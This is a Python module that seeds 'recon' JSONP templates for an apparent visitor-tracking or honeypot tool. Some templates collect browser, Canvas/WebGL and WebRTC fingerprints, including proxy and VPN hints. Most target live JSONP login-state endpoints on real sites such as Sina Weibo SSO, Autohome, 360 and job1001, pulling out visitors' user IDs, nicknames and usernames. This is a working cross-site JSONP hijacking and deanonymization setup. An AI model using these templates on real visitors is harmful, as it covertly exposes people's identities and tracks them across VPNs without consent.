import json
import re
from collections import UserDict
from datetime import datetime, timezone

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.models.jsonp_template import JsonpTemplate


DEFAULT_JSONP_TEMPLATES = [
    {
        "method_key": "browser_fingerprint",
        "name": "基础浏览器指纹回调",
        "request_method": "GET",
        "endpoint_path": "/recon/jsonp",
        "callback_param": "callback",
        "description": "采集浏览器、屏幕、语言、时区和基础指纹标识。",
        "params_json": ["fingerprint", "ua", "screen", "timezone", "language"],
        "response_template": '{"status":"collected","method":"browser_fingerprint","timestamp":"{timestamp}","fingerprint":"{fingerprint}","source_ip":"{source_ip}"}',
        "is_active": True,
    },
    {
        "method_key": "webrtc_probe",
        "name": "WebRTC 地址探测回调",
        "request_method": "GET",
        "endpoint_path": "/recon/jsonp",
        "callback_param": "callback",
        "description": "用于接收 WebRTC 候选地址、代理/VPN 线索和浏览器网络环境。",
        "params_json": ["fingerprint", "webrtc_ips", "network_type", "proxy_hint"],
        "response_template": '{"status":"collected","method":"webrtc_probe","timestamp":"{timestamp}","webrtc_ips":"{webrtc_ips}","source_ip":"{source_ip}"}',
        "is_active": True,
    },
    {
        "method_key": "canvas_webgl_probe",
        "name": "Canvas / WebGL 指纹回调",
        "request_method": "GET",
        "endpoint_path": "/recon/jsonp",
        "callback_param": "callback",
        "description": "用于接收 Canvas Hash、WebGL Vendor、Renderer 等设备指纹。",
        "params_json": ["canvas_hash", "webgl_vendor", "webgl_renderer", "pixel_ratio"],
        "response_template": '{"status":"collected","method":"canvas_webgl_probe","timestamp":"{timestamp}","canvas_hash":"{canvas_hash}","webgl_vendor":"{webgl_vendor}","webgl_renderer":"{webgl_renderer}"}',
        "is_active": True,
    },
    {'method_key': 'baidu_musichub', 'name': '百度 Musichub Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://sp0.baidu.com/5LMDcjW6BwF3otqbppnN2DJv/music.pae.baidu.com/music/api/musichub', 'callback_param': 'cb', 'description': '来源 test.js：百度音乐 Musichub JSONP，固定参数 action=musichub，回调函数 funMusichub，提取标题字段作为侧证。', 'params_json': ['data.tplList[0].data.title'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"百度 Musichub Jsonp","method":"baidu_musichub","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://sp0.baidu.com/5LMDcjW6BwF3otqbppnN2DJv/music.pae.baidu.com/music/api/musichub?action=musichub&cb=funMusichub","callback_param":"cb","callback_function":"funMusichub","static_params":{"action":"musichub"},"extract_fields":["data.tplList[0].data.title"]}', 'is_active': True},
    {'method_key': 'sina_sso_login', 'name': '新浪微博 SSO Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://login.sina.com.cn/sso/login.php', 'callback_param': 'callback', 'description': '来源 test.js：新浪微博 SSO 登录态 JSONP，回调函数 wbCallback，提取 uid 与 nick。', 'params_json': ['uid', 'nick'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"新浪微博 SSO Jsonp","method":"sina_sso_login","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://login.sina.com.cn/sso/login.php?client=&service=&client=&encoding=&gateway=1&returntype=TEXT&useticket=0&callback=wbCallback","callback_param":"callback","callback_function":"wbCallback","static_params":{"client":"","service":"","encoding":"","gateway":"1","returntype":"TEXT","useticket":"0"},"extract_fields":["uid","nick"]}', 'is_active': True},
    {'method_key': 'autohome_user_state', 'name': '汽车之家用户状态 Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://account.autohome.com.cn/upgrade/getuserstate', 'callback_param': 'callback', 'description': '来源 test.js：汽车之家账号用户状态 JSONP，回调函数 carCallback，提取 NickName。', 'params_json': ['NickName'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"汽车之家用户状态 Jsonp","method":"autohome_user_state","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://account.autohome.com.cn/upgrade/getuserstate?callback=carCallback","callback_param":"callback","callback_function":"carCallback","static_params":{},"extract_fields":["NickName"]}', 'is_active': True},
    {'method_key': 'qihoo360_profile_identity', 'name': '360 账号身份 Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://profile.wg.360.cn/api/profile/getIdentity', 'callback_param': 'callback', 'description': '来源 test.js：360 profile 身份 JSONP，回调函数 tszCallback，提取 data.qid 与 data.username。', 'params_json': ['data.qid', 'data.username'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"360 账号身份 Jsonp","method":"qihoo360_profile_identity","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://profile.wg.360.cn/api/profile/getIdentity?callback=tszCallback","callback_param":"callback","callback_function":"tszCallback","static_params":{},"extract_fields":["data.qid","data.username"]}', 'is_active': True},
    {'method_key': 'bjx_login_state', 'name': '北极星登录态 Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://passport.bjx.com.cn/Account/LoginStateV3ForJsonp', 'callback_param': 'callback', 'description': '来源 test.js：北极星 Passport 登录态 JSONP，回调函数 bjxCallback，提取 uid 与 name。', 'params_json': ['uid', 'name'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"北极星登录态 Jsonp","method":"bjx_login_state","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://passport.bjx.com.cn/Account/LoginStateV3ForJsonp?callback=bjxCallback","callback_param":"callback","callback_function":"bjxCallback","static_params":{},"extract_fields":["uid","name"]}', 'is_active': True},
    {'method_key': 'pchouse_logged_user', 'name': '太平洋家居登录用户 Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://my.pchouse.com.cn/intf/getLogedUser.jsp', 'callback_param': 'callback', 'description': '来源 test.js：太平洋家居登录用户 JSONP，回调函数 typCallback，提取 id 与 nickName。', 'params_json': ['id', 'nickName'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"太平洋家居登录用户 Jsonp","method":"pchouse_logged_user","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://my.pchouse.com.cn/intf/getLogedUser.jsp?callback=typCallback","callback_param":"callback","callback_function":"typCallback","static_params":{},"extract_fields":["id","nickName"]}', 'is_active': True},
    {'method_key': 'job1001_user_state', 'name': '一览招聘用户状态 Jsonp', 'request_method': 'GET', 'endpoint_path': 'https://tj198.job1001.com/wssn.php', 'callback_param': 'callback', 'description': '来源 test.js：一览招聘用户状态 JSONP，回调函数 ylzpCallback，携带空状态参数并提取 c_job1001UserId。', 'params_json': ['c_job1001UserId'], 'response_template': '{"status":"vendor_jsonp_template","vendor":"一览招聘用户状态 Jsonp","method":"job1001_user_state","timestamp":"{timestamp}","source_ip":"{source_ip}","jsonp_url":"https://tj198.job1001.com/wssn.php?c_job1001UserId=&c_pesonAbc=&normalLogin=&psid=&callback=ylzpCallback","callback_param":"callback","callback_function":"ylzpCallback","static_params":{"c_job1001UserId":"","c_pesonAbc":"","normalLogin":"","psid":""},"extract_fields":["c_job1001UserId"]}', 'is_active': True},
]


class _SafeFormatDict(UserDict):
    def __missing__(self, key):
        return ""


def params_from_csv(text: str) -> list[str]:
    return [item.strip() for item in (text or "").split(",") if item.strip()]


def normalize_method_key(value: str) -> str:
    raw = (value or "").strip().lower().replace(" ", "_").replace("-", "_")
    safe = "".join(ch if ch.isalnum() or ch == "_" else "_" for ch in raw)
    while "__" in safe:
        safe = safe.replace("__", "_")
    return safe.strip("_")[:96]


def normalize_endpoint_path(value: str) -> str:
    path = (value or "/recon/jsonp").strip() or "/recon/jsonp"
    if path.lower().startswith(("http://", "https://")):
        return path
    if not path.startswith("/"):
        path = f"/{path}"
    return path




def get_jsonp_template(db: Session, method_key: str | None) -> JsonpTemplate | None:
    key = normalize_method_key(method_key or "")
    stmt = select(JsonpTemplate).where(JsonpTemplate.is_active.is_(True))
    if key:
        item = db.scalar(stmt.where(JsonpTemplate.method_key == key))
        if item:
            return item
    return db.scalar(stmt.order_by(JsonpTemplate.name).limit(1))


def render_jsonp_template_payload(
    template: JsonpTemplate | None,
    *,
    source_ip: str,
    query_params: dict,
) -> dict:
    base_context = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source_ip": source_ip,
        "method_key": template.method_key if template else "default",
        "method_name": template.name if template else "JSONP",
        **{key: str(value) for key, value in query_params.items()},
    }
    if not template or not (template.response_template or "").strip():
        return {
            "status": "collected",
            "timestamp": base_context["timestamp"],
            "source_ip": source_ip,
        }

    rendered = re.sub(
        r"\{([A-Za-z_][A-Za-z0-9_]*)\}",
        lambda match: str(_SafeFormatDict(base_context)[match.group(1)]),
        template.response_template,
    )
    try:
        payload = json.loads(rendered)
    except json.JSONDecodeError:
        payload = {"status": "collected", "raw": rendered}
    payload.setdefault("method", template.method_key)
    payload.setdefault("timestamp", base_context["timestamp"])
    return payload
